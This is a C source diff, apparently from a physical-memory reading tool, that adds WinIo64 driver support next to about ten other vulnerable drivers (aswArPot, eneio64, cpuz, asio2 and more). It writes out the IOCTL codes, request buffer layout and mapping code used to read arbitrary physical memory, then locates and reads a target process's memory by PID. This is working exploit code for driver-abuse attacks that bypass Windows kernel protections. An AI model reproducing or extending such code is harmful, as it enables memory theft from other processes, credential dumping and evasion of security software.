@@ -343,6 +343,39 @@ static int read_aswarpot(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t siz
     return 1;
 }
 
+// ---- 取数层 provider: WinIo64 (classic physical map driver) ----
+// Device \\.\WinIo. IOCTL_WINIO_MAPPHYSTOLIN (0x80102040):
+//   input/output 0x28: {u64 size; u64 phys_start; HANDLE section_handle;
+//                       u64 user_va; u64 object}
+// Unmap: 0x80102044 (same buffer). The driver maps \Device\PhysicalMemory.
+static int winio64_build_map_request(uint64_t pa, uint32_t size, uint8_t out[0x28]) {
+    if (!out || !size) return 0;
+    uint64_t page = pa & ~0xFFFull;
+    uint64_t end = pa + size;
+    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
+    uint64_t map_size = page_end - page;
+    if (map_size > 0x1000000) return 0;
+    memset(out, 0, 0x28);
+    *(uint64_t *)(out + 0x00) = map_size;
+    *(uint64_t *)(out + 0x08) = page;
+    return 1;
+}
+
+static int read_winio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t req[0x28];
+    DWORD ret = 0;
+    if (!winio64_build_map_request(pa, size, req)) return 0;
+    if (!DeviceIoControl(r->dev, 0x80102040u, req, sizeof(req), req, sizeof(req), &ret, NULL))
+        return 0;
+    uint64_t uva = *(uint64_t *)(req + 0x18);
+    if (uva < 0x10000) return 0;
+    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
+    req[0x00] = 0;  // keep section handle/object/user_va for unmap
+    DeviceIoControl(r->dev, 0x80102044u, req, sizeof(req), req, sizeof(req), &ret, NULL);
+    return 1;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -431,8 +464,17 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
         }
         if (r->dev == INVALID_HANDLE_VALUE)
             fprintf(stderr, "[HINT] aswArPot device not found (try --device \\\\.\\aswSP_ArPot2)\n");
+    } else if (_stricmp(kind, "winio64") == 0) {
+        r->name = "winio64";
+        r->mode = 10;
+        r->read = read_winio64;
+        r->dev = CreateFileA(device ? device : "\\\\.\\WinIo",
+                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+        if (r->dev == INVALID_HANDLE_VALUE)
+            fprintf(stderr, "[HINT] WinIo64 device not found (need WinIo64.sys loaded)\n");
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -1052,6 +1094,13 @@ static int selftest_mock(void) {
                   *(uint32_t *)(aswrq + 8) == 0x1000;
     check("取数层(fetcher)", "aswArPot physical read request layout", ok_aswr);
 
+    // WinIo64 MAPPHYSTOLIN request layout (offline, no driver)
+    uint8_t wioreq[0x28];
+    int ok_wio = winio64_build_map_request(0x12345678, 0x100, wioreq) &&
+                 *(uint64_t *)(wioreq + 0x00) == 0x1000 &&
+                 *(uint64_t *)(wioreq + 0x08) == 0x12345000ull;
+    check("取数层(fetcher)", "winio64 map request layout (size/phys)", ok_wio);
+
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
@@ -1165,10 +1214,10 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
